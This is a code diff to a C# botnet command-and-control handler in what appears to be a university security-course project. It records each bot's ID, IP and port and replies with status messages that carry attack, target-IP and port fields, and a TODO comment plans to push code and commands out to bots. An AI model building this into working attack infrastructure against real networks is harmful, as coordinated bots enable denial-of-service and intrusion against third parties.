@@ -30,12 +30,15 @@ namespace Coms4507_Project.BotHandling
         public string attackType = "idle";
         public string requestType = "status";
 
+        private Dictionary<string, string> botIpPortDetails;
+
         public BotHandler(string ip)
         {
             bots = new List<string>();
             networkHandler = new NetworkHandler(ip);
             Thread thread = new Thread(Listener);
             thread.Start();
+            botIpPortDetails = new Dictionary<string, string>();
         }
 
         private void Listener()
@@ -54,6 +57,16 @@ namespace Coms4507_Project.BotHandling
                     string ip = jData.GetValue("ip").ToString();
                     string hostID = jData.GetValue("id").ToString();
                     string status = jData.GetValue("status").ToString();
+                    string port = message["port"];
+
+                    botIpPortDetails[hostID] = ip + "::" + port;
+                    Trace.WriteLine(botIpPortDetails.ToString());
+                    /*
+                     * TODO: Write in components here to extract information, identify which bot is which, then go through the list of IPs/port nums
+                     * being used by the bots to distribute out the code.
+                     * 
+                     * ID (ULTRASTEED) -> ip::port_num to communicate with. That way we can issue commands through a dictionary of bots.
+                     */
 
                     // Build the status JObject here
                     Dictionary<string, object> data = new Dictionary<string, object>
@@ -61,12 +74,10 @@ namespace Coms4507_Project.BotHandling
                         { "request", requestType },
                         { "attack", "none" },
                         { "targetIP", "none" },
+                        { "ports", "[]" },
                         { "runtime", "*" }
                     };
 
-
-
-                    Trace.WriteLine(message["payload"] + "::" + message["ip"] + "::" + message["port"]);
                     networkHandler.SendMessage(JObject.FromObject(data).ToString(), message["ip"], message["port"]);
                 }
                 catch (Exception ex)
